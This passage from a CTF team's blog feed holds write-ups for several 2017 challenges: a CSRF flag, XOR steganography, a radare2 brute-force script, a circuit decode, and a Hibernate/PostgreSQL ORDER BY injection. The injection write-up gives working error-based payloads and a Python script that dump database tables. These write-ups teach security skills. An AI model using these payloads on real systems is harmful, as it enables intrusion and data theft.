<p>Submitting the form like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/mpvECw9.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/mpvECw9.png" alt=""><br></a><br>If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console:<br><a data-fancybox="gallery" href="https://i.imgur.com/g81VCRj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/g81VCRj.png" alt=""><br></a></p>
<p>After a while we would receive an email with the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;It’s Common Sense&lt;br&gt;100&lt;br&gt;&lt;br&gt;Common Sense Reviews was fixed last night. If you believe you had a working sol. last night 
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
    
      <category term="xss" scheme="https://teamrocketist.github.io/tags/xss/"/>
    
      <category term="passwordreset" scheme="https://teamrocketist.github.io/tags/passwordreset/"/>
    
      <category term="jquery" scheme="https://teamrocketist.github.io/tags/jquery/"/>
    
  </entry>
  
  <entry>
    <title>[Misc] TUCTF - Gr8 Pictures</title>
    <link href="https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/"/>
    <id>https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/</id>
    <published>2017-12-01T07:58:48.000Z</published>
    <updated>2017-12-01T12:03:55.940Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Gr8 Pictures<br>50<br><br>The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know that he connects to gr8pics.tuctf.com:4444 to hide his message in the picture. Your mission, should you choose to accept it, is to find out what message he is trying to hide.<br><br>nc gr8pics.tuctf.com 4444<br>If you get connection refused, use nc gr8pics.tuctf.com 41234<br>NOTE: the server does not show a prompt, but if the connection is successful, you are at the correct starting point.<br>NOTE: without connecting to the server, the flag is theoretically cryptographically impossible to get<br>NOTE: If you’re getting a bunch of data that doesn’t seem to stop - it stops after ~3MB of data<br><br>sha1<br>9044fe96a50ecb831fe451f13c24cc96b0a9e24d flag.png<br><br></blockquote>

<p>This was a simple misc, we were told in the challenge description that a hacker from 4chan was using this service to hide messages within images, if we sent a message with a length &gt;= 50 the service would return an image with the message hidden within in the image, after receiving it I noticed that the only difference between the image given from the challenge and the one generated in the service was 50 bytes (which makes sense since I sent a message with 50 length), I was suspicious that the server were encrypting the message using a simple xor so to test this I sent 50 null bytes to the service:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print '\x00'*50"</span> | nc gr8pics.tuctf.com 4444 | base64 -d &gt; flag2.png</div></pre></td></tr></table></figure>
<p>But why send only null bytes? If they are using xor we can retrieve the key completely! xoring any number by zero will return always the number! You could easily get the 50 new bytes by comparing all non equal bytes between flag.png flag2.png:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">file2 = open(<span class="string">'flag2.png'</span>, <span class="string">'rb'</span>)</div><div class="line">file = open(<span class="string">'flag.png'</span>, <span class="string">'rb'</span>)</div><div class="line">s = bytearray(file.read())</div><div class="line">s2 = bytearray(file2.read())</div><div class="line"></div><div class="line">k = <span class="number">0</span></div><div class="line">key = <span class="string">''</span></div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</div><div class="line">  <span class="keyword">if</span> s[i] != s2[i]:</div><div class="line">    key += chr(s2[i])</div><div class="line"></div><div class="line"><span class="keyword">print</span> key</div></pre></td></tr></table></figure>
<p>By running it we could easily get the key!<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py</div><div class="line">Isnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0r</div></pre></td></tr></table></figure></p>
<p>Having the key is easy to decrypt the original flag we just need to adapt our script to:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">file2 = open(<span class="string">'test.png'</span>, <span class="string">'rb'</span>)</div><div class="line">file = open(<span class="string">'flag.png'</span>, <span class="string">'rb'</span>)</div><div class="line">s = bytearray(file.read())</div><div class="line">s2 = bytearray(file2.read())</div><div class="line"></div><div class="line">k = <span class="number">0</span></div><div class="line">key = <span class="string">''</span></div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</div><div class="line">  <span class="keyword">if</span> s[i] != s2[i]:</div><div class="line">    key += chr(s2[i])</div><div class="line">    flag += chr(s[i] ^ s2[i])</div><div class="line"><span class="keyword">print</span> key</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>And finally the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py</div><div class="line">Isnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0r</div><div class="line">TUCTF&#123;st3g@n0gr@phy<span class="string">'s_so_c00l,No0ne_steals_my_msg&#125;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Gr8 Pictures&lt;br&gt;50&lt;br&gt;&lt;br&gt;The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="misc" scheme="https://teamrocketist.github.io/tags/misc/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] TUCTF - Unknown</title>
    <link href="https://teamrocketist.github.io/2017/11/27/Reverse-TUCTF-Unknown/"/>
    <id>https://teamrocketist.github.io/2017/11/27/Reverse-TUCTF-Unknown/</id>
    <published>2017-11-27T05:27:55.000Z</published>
    <updated>2017-11-27T06:09:18.351Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Unknown<br>200<br><br>Diggin through some old files we discovered this binary. Although despite our inspection we can’t figure out what it does. Or what it wants…<br><br>unknown - md5: 9f08f6e8240d4a0e098c4065c5737ca6<br><br></blockquote>

<h3 id="Reversing-the-binary"><a href="#Reversing-the-binary" class="headerlink" title="Reversing the binary"></a>Reversing the binary</h3><p>The binary has the following restrictions, we need to provide the correct flag as <code>argv[1]</code> and the length of the flag must have 56 of length as we can see bellow in the assembly:<br><a data-fancybox="gallery" href="https://i.imgur.com/iaNqW68.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/iaNqW68.png" alt=""><br></a><br>After this initial checks we are going to have a loop that checks each byte of the flag provided using a big encryption function <code>fcn.00401e90</code>, we can easily check if the byte is correct or not by checking the value of <code>RAX</code> after the function returns as it is explained in the image below:<br><a data-fancybox="gallery" href="https://i.imgur.com/AtYkwlN.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AtYkwlN.png" alt=""><br></a></p>
<h3 id="Radare2-Script"><a href="#Radare2-Script" class="headerlink" title="Radare2 Script"></a>Radare2 Script</h3><p>We don’t really need to reverse the encryption function <code>fcn.00401e90</code>, since we can write a radare2 script that checks the return values(<code>RAX</code>) from this function we can just brute-force the flag byte by byte, we need to update the address where the string is stored at each iteration/tentative, and in failed attempts we need to decrement the counter of the loop so we can recheck the same flag byte, this can be done with a script like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_string</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'%x'</span>% ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> s])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_address_value</span><span class="params">(addr, value)</span>:</span></div><div class="line">    r2.cmd(<span class="string">'s %s'</span> % addr)</div><div class="line">    r2.cmd(<span class="string">'wx %s'</span> % value)</div><div class="line">    r2.cmd(<span class="string">'s rip'</span>)</div><div class="line">            </div><div class="line"></div><div class="line">flag_try = <span class="string">'TUCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;'</span></div><div class="line">flag_list = list(flag_try)</div><div class="line"></div><div class="line">r2=r2pipe.open(<span class="string">'./unknown'</span>, flags=[<span class="string">'-2'</span>])</div><div class="line">r2.cmd(<span class="string">"ood %s"</span> % flag_try)</div><div class="line">r2.cmd(<span class="string">"aa"</span>)</div><div class="line">r2.cmd(<span class="string">"db 0x401c39"</span>)</div><div class="line">r2.cmd(<span class="string">"db 0x401C82"</span>)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">flag_address = r2.cmd(<span class="string">"dr rax"</span>)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">characters = string.ascii_lowercase+ string.digits + <span class="string">'_!&#125;'</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(flag_list)):</div><div class="line">    <span class="keyword">for</span> i,s <span class="keyword">in</span> enumerate(characters):</div><div class="line">        <span class="keyword">if</span> j &gt; <span class="number">5</span>:</div><div class="line">            flag_list[j] = s</div><div class="line">            change_address_value(flag_address, transform_string(<span class="string">''</span>.join(flag_list)))</div><div class="line">    </div><div class="line">        num = r2.cmd(<span class="string">'dr rax'</span>)</div><div class="line">        <span class="keyword">if</span> int(num,<span class="number">16</span>) == <span class="number">0x0</span>:</div><div class="line">            <span class="keyword">if</span> j &gt; <span class="number">5</span>:</div><div class="line">                flag_list[j] = characters[i<span class="number">-1</span>]</div><div class="line">                change_address_value(flag_address, transform_string(<span class="string">''</span>.join(flag_list)))</div><div class="line">            r2.cmd(<span class="string">'dc'</span>)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            r2.cmd(<span class="string">'dr rax = 0x0'</span>)</div><div class="line">            change_address_value(<span class="string">'rbp-0xc'</span>, <span class="string">'%02x000000'</span> % (j<span class="number">-1</span>))           </div><div class="line">            r2.cmd(<span class="string">'dc'</span>)</div><div class="line">        sys.stdout.write(<span class="string">'\r'</span>+<span class="string">''</span>.join(flag_list))</div><div class="line">        sys.stdout.flush()</div></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python unknown.py</div><div class="line">TUCTF&#123;w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Unknown&lt;br&gt;200&lt;br&gt;&lt;br&gt;Diggin through some old files we discovered this binary. Although despite our inspection we can’t figu
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
    
      <category term="r2script" scheme="https://teamrocketist.github.io/tags/r2script/"/>
    
      <category term="tuctf2017" scheme="https://teamrocketist.github.io/tags/tuctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Electronics] Pwn2Win - Top Secret</title>
    <link href="https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/"/>
    <id>https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/</id>
    <published>2017-10-28T15:25:56.000Z</published>
    <updated>2017-10-28T15:50:44.446Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Top Secret<br><br>Molly was able to take pictures of a strange digital circuit sketch, along with an also strange message. All of these things were inside an envelope in a safe, which was labeled “Top Secret”.<br><br>We believe it might contain Butcher Corp’s plans for the future, can you help us read the message?<br><br>Link<br><br>Mirror<br><br>Id: top_secret<br><br>Total solves: 40<br><br>Score: 223<br><br>Categories: Eletronics<br></blockquote>

<p>To solve this problem the circuit is first analyzed and divided in to different blocks based on their function. The circuit can be divided in to four different functional blocks: The <strong>counter</strong>, the <strong>Multiplexer</strong> (LED Matrix line driver), the <strong>input circuit</strong> (LED Matrix column driver) and the <strong>8x8 LED Matrix</strong> (the Output).</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/aZZK1D4.jpg" target="_blank" rel="external"><br><img src="https://i.imgur.com/aZZK1D4.jpg" alt=""><br></a></p>
<p>The <strong>counter circuit</strong> counts from 0 to 7, the increments are done every falling edge. The clock is the 0 input. The output of the counter is a <strong>3-line binary number</strong> that is the line selection input of the <strong>multiplexer circuit</strong>. The main input of the multiplexer is connected to a <strong>high signal (binary 1)</strong>. </p>
<p>The multiplexer puts one line of its outputs (8 line multiplexer) in a <strong>high state</strong> and all others at a <strong>low state</strong>. The 3-line input from the counter selects the line which is to be put in a high state. The line output of the multiplexer is connected to a <strong>BJT transistor</strong> that connects the <strong>LED Matrix line</strong> to a low signal (binary 0) <strong>when this multiplexer output is in a high state</strong>. Basically, the BJT transistor <strong>works like a NOT gate</strong>.</p>
<p>In the input block every input is also connected to a <strong>BJT transistor</strong>. When an input is in the high state, the transistor connects the LED matrix column to a logical 0, and vice versa when the input is in a low state. Again, basically <strong>like a NOT gate</strong>. Some inputs have two transistors in series, so basically to NOT gates in series, and therefore here <strong>when the input signal is in a high state</strong>, the <strong>corresponding column is also</strong> in a high state.</p>
<p>Finally, in the LED matrix, every led is connected from a column to a line. A LED lights up when the column is in a logical high state and the line in a logical low state.</p>
<p>Combing this information with the <strong>received input sequence</strong> and <strong>aligning the date with all the inputs (0 to 8)</strong>, it is<strong> possible to decode </strong>what is shown in the LED matrix. To do this, the data is aligned and then imported to excel where, with some simple logic, the needed bits are flipped (based on the NOT inputs) and then with <strong>conditional formatting the LED outputs are simulated</strong>, RED is an off led and green a ON led. This is shown in the picture below, for the first character only, where the table on the left is the original data and the table on the left the interpreted data.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/26OngjS.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/26OngjS.png" alt=""><br></a></p>
<p>The full excel file can be found in this <a href="/content/files/pwn2win-2017/Test.xlsx">link</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Top Secret&lt;br&gt;&lt;br&gt;Molly was able to take pictures of a strange digital circuit sketch, along with an also strange message. A
    
    </summary>
    
      <category term="Electronics" scheme="https://teamrocketist.github.io/categories/Electronics/"/>
    
    
      <category term="electronics" scheme="https://teamrocketist.github.io/tags/electronics/"/>
    
      <category term="circuits" scheme="https://teamrocketist.github.io/tags/circuits/"/>
    
      <category term="transistor" scheme="https://teamrocketist.github.io/tags/transistor/"/>
    
      <category term="led" scheme="https://teamrocketist.github.io/tags/led/"/>
    
      <category term="logic" scheme="https://teamrocketist.github.io/tags/logic/"/>
    
      <category term="multiplexer" scheme="https://teamrocketist.github.io/tags/multiplexer/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Pwn2Win - Criminals</title>
    <link href="https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/"/>
    <id>https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/</id>
    <published>2017-10-24T06:53:16.000Z</published>
    <updated>2017-10-24T06:59:23.808Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Criminals<br><br>Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.<br><br><a href="http://200.136.213.109/" target="_blank" rel="external">http://200.136.213.109/</a><br><br>Automated tools are NOT required and NOT allowed.<br><br>Id: criminals<br><br>Total solves: 9<br><br>Score: 363<br><br>Categories: Web<br></blockquote>

<p>This web challenge only has one page and has this form bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/W7HlrKk.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/W7HlrKk.png" alt=""><br></a></p>
<p>The form has 4 inputs if we test each one of them with a single quote we will notice that an error pops up and we can see the admin of the website did use prepared statements but forgot about the order GET param:<br><a data-fancybox="gallery" href="https://i.imgur.com/a6pb0Ae.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/a6pb0Ae.png" alt=""><br></a><br>Now to solve this challenge we need first to check which <strong>dbms</strong> is running by just checking the error in the image we can see that is running on <strong>HBL</strong> (The Hibernate Query Language), some kind of a modified SQL with some restrictions, before talking about this lets first find which <strong>dbms</strong> is running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://200.136.213.109/'</span>  --data <span class="string">"name=&amp;age=&amp;crime=&amp;order=abs(1)||2"</span> 2&gt;/dev/null | grep <span class="string">'post'</span></div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: operator does not exist: <span class="built_in">integer</span> || <span class="built_in">integer</span></div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102)</div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835)</div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:388)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdbc2Statement.java:273)</div></pre></td></tr></table></figure>
<p>With this query we can generate an error that leaks the <strong>dbms</strong> it’s postgresql! now we need to find a way to inject and dump the database, I knew some injections in order by with <strong>mysql</strong> but in <strong>postgresql</strong> is somehow different and what the worst about this are the limitations we got from <strong>HBL</strong>.</p>
<p>AAfter spending alot of time trying to execute a subquery, I started searching on google, I knew we needed to something related with XML queries (Order by injections in MySql are similar) and then I found this great slides: </p>
<p><a href="https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf" target="_blank" rel="external">https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf</a><br><a data-fancybox="gallery" href="https://i.imgur.com/IvoeP2v.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/IvoeP2v.png" alt=""><br></a></p>
<p>This is perfect to put in the <strong>order by query</strong> this will return an integer and we can execute a subquery like we wanted, but the question is how are we going to leaking info? Postgres has a very nice feature, if we cast a string into an integer from a select for example we will generate an error! and the output of that sql query will be printed in the error! For this I used another function called <strong>pg_ls_dir</strong> this can list directories, if we use this to list the current directory and cast it into integer we are going to generate an error, leaking the directory for example:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_upper(xpath ('row', query_to_xml ('<span class="keyword">select</span> <span class="keyword">cast</span>(pg_ls_dir(<span class="keyword">CHR</span>(<span class="number">46</span>))<span class="keyword">as</span> <span class="built_in">int</span>)<span class="string">', true,  false,'')),1)</span></div></pre></td></tr></table></figure>
<p>The output of this query is:<br><a data-fancybox="gallery" href="https://i.imgur.com/KaRVqJi.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/KaRVqJi.png" alt=""><br></a></p>
<p>As you can see above we leaked one directory named <strong>pg_xlog</strong> we can do exactly the same but instead of trying to read the log files we can leak the tables like this:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_upper(xpath ('row', query_to_xml ('<span class="keyword">select</span> <span class="keyword">cast</span>(pg_ls_dir((<span class="keyword">SELECT</span> column_name || <span class="keyword">CHR</span>(<span class="number">44</span>) || table_name <span class="keyword">FROM</span> information_schema.columns c <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)) <span class="keyword">as</span> <span class="built_in">int</span>)<span class="string">', true,  false,'')),1)</span></div></pre></td></tr></table></figure>
<p>The output of this query is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://200.136.213.109/'</span>  --data <span class="string">"name=&amp;age=&amp;crime=&amp;order=array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true,  false,'')),1)"</span> 2&gt;/dev/null | grep <span class="string">'root cause'</span></div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;javax.persistence.PersistenceException: org.hibernate.exception.GenericJDBCException: could not extract ResultSet</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.hibernate.exception.GenericJDBCException: could not extract ResultSet</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: could not open directory &amp;quot;secret,flag&amp;quot;: No such file or directory</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available <span class="keyword">in</span> the Apache Tomcat/8.0.47 logs.&lt;/u&gt;&lt;/p&gt;&lt;hr class=<span class="string">"line"</span>&gt;&lt;h3&gt;Apache Tomcat/8.0.47&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>We just leaked the table flag and the column secret! we can easily write a python script that leaks all the tables and gets the flag for us like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">host = <span class="string">'http://200.136.213.109/'</span></div><div class="line">data = &#123;<span class="string">'name'</span>:<span class="string">''</span>,<span class="string">'crime'</span>:<span class="string">''</span>,<span class="string">'order'</span>:<span class="string">''</span>,<span class="string">'age'</span>:<span class="string">''</span>&#125;</div><div class="line">query = <span class="string">"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset &#123;&#125;)) as int)', true,  false,'')),1)"</span></div><div class="line">queryflag = <span class="string">"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset &#123;&#125;)) as int)', true,  false,'')),1)"</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">6</span>):</div><div class="line">	<span class="comment">#print x</span></div><div class="line">	data[<span class="string">'order'</span>] = query.format(x)</div><div class="line">	<span class="keyword">print</span> data[<span class="string">'order'</span>]</div><div class="line">	r = requests.post(host, data=data)</div><div class="line">	<span class="keyword">print</span> re.findall(<span class="string">r'&amp;quot;([A-Za-z0-9_\-&#123;&#125;,]+)&amp;quot;'</span>, r.text)</div><div class="line">data[<span class="string">'order'</span>] = queryflag.format(<span class="number">0</span>)</div><div class="line"><span class="keyword">print</span> data[<span class="string">'order'</span>]</div><div class="line">r = requests.post(host,data=data)</div><div class="line"><span class="keyword">print</span> re.findall(<span class="string">r'&amp;quot;([A-Za-z0-9_\-&#123;&#125;]+)&amp;quot;'</span>, r.text)</div></pre></td></tr></table></figure>
<p>Now running the script:</p>
<pre><code class="bash">$ python HQLI.py
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'secret,flag'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 1)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'id,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 2)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'age,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 3)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'crime,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 4)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'last_location,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 5)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'name,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset 0)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}'</span>]
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Criminals&lt;br&gt;&lt;br&gt;Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.&lt;br&gt;&lt;br&gt;&lt;a href
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="hqli" scheme="https://teamrocketist.github.io/tags/hqli/"/>
    
      <category term="xmlqueries" scheme="https://teamrocketist.github.io/tags/xmlqueries/"/>
    
